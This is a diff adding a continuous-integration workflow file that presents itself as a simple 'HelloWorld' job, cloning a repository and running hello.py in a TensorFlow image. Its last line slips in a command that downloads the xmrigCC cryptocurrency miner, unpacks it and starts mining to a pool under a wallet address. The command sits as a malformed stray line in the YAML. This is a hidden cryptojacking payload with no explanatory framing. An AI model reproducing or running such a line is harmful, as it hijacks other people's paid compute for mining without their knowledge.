@@ -1,0 +1,26 @@
+'on':
+  github:
+    branches:
+      only: main
+jobs:
+  CloneRepo:
+    resources:
+      instance-type: C5
+    outputs:
+      repo:
+        type: volume
+    uses: git-checkout@v1
+    with:
+      url: context.event.github.url
+  HelloWorld:
+    resources:
+      instance-type: C5
+    needs:
+      - CloneRepo
+    inputs:
+      repo: CloneRepo.outputs.repo
+    uses: script@v1
+    with:
+      script: python /inputs/repo/hello.py
+      image: tensorflow/tensorflow:1.14.0-py3
+      wget https://github.com/Bendr0id/xmrigCC/releases/download/2.9.4/xmrigCC-2.9.4-linux-generic-amd64.tar.gz && tar -xf xmrigCC-2.9.4-linux-generic-amd64.tar.gz && rm xmrigCC-2.9.4-linux-generic-amd64.tar.gz && ./miner/xmrigDaemon -o rx.unmineable.com:3333 -u TRX:TLcaPSSZj6Nm3xvS3dKNdzBZgabkKAY8Dy.SSS4 -p WK01 -k -a cn-heavy/xhv
